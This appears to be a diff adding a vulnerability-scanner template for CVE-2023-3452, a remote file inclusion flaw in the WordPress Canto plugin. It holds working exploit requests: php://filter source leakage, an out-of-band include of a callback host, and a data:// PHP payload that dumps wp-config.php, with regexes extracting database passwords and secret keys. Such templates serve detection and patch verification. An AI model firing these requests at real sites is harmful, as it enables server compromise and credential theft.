@@ -1,0 +1,99 @@
+id: CVE-2023-3452
+
+info:
+  name: WordPress Canto Plugin <= 3.0.4 - Remote File Inclusion/RCE
+  author: omarkurt
+  severity: critical
+  description: |
+    The Canto plugin for WordPress is vulnerable to Remote File Inclusion
+    in versions up to 3.0.4 via the wp_abspath parameter in download.php.
+    The vulnerable code (require_once($_REQUEST['wp_abspath'].'/wp-admin/admin.php'))
+    allows unauthenticated attackers to manipulate the include path.
+    Step 1 uses php://filter (works regardless of allow_url_include) to leak
+    wp-admin/admin.php source code as base64, confirming path manipulation.
+    Step 2 uses interactsh OOB callback to verify RFI (requires allow_url_include=On).
+    Step 3 uses data:// wrapper to execute inline PHP and dump wp-config.php
+    containing database credentials and secrets (requires allow_url_include=On).
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2023-3452
+    - https://www.exploit-db.com/exploits/51826
+    - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/canto/canto-304-unauthenticated-remote-file-inclusion
+    - https://github.com/jesusgavancho/CVE-2023-3452-PoC
+    - https://vulnerabletarget.com/VT-2023-3452 
+  classification:
+    cve-id: CVE-2023-3452
+    cwe-id: CWE-98
+    cvss-score: 9.8
+  tags: cve,cve2023,wordpress,wp-plugin,canto,rfi,rce,unauth,critical
+  metadata:
+    verified: true
+    max-request: 3
+
+flow: http(1) || http(2) || http(3)
+
+http:
+  # Step 1: php://filter - Universal detection (allow_url_include irrelevant)
+  # Leaks wp-admin/admin.php source as base64 via stream wrapper
+  - raw:
+      - |
+        GET /wp-content/plugins/canto/includes/lib/download.php?wp_abspath=php://filter/convert.base64-encode/resource=/var/www/html HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "PD9waHAK"
+          - "V29yZFByZXNz"
+        condition: or
+
+  # Step 2: interactsh - OOB RFI verification (requires allow_url_include=On)
+  # Server attempts to fetch http://INTERACTSH/wp-admin/admin.php
+  - raw:
+      - |
+        GET /wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://{{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+
+  # Step 3: data:// wrapper - RCE to dump wp-config.php (requires allow_url_include=On)
+  # Reads WordPress config file containing DB credentials and secret keys
+  - raw:
+      - |
+        GET /wp-content/plugins/canto/includes/lib/download.php?wp_abspath=data://text/plain,<%3fphp+echo+file_get_contents('/var/www/html/wp-config.php')%3bdie()%3b%3f> HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "DB_NAME"
+          - "DB_PASSWORD"
+        condition: and
+
+    extractors:
+      - type: regex
+        name: db-credentials
+        part: body
+        regex:
+          - "define\\( 'DB_(NAME|USER|PASSWORD|HOST)'.*"
+
+      - type: regex
+        name: secret-keys
+        part: body
+        regex:
+          - "define\\( '(AUTH_KEY|SECURE_AUTH_KEY|LOGGED_IN_KEY|NONCE_KEY)'.*"
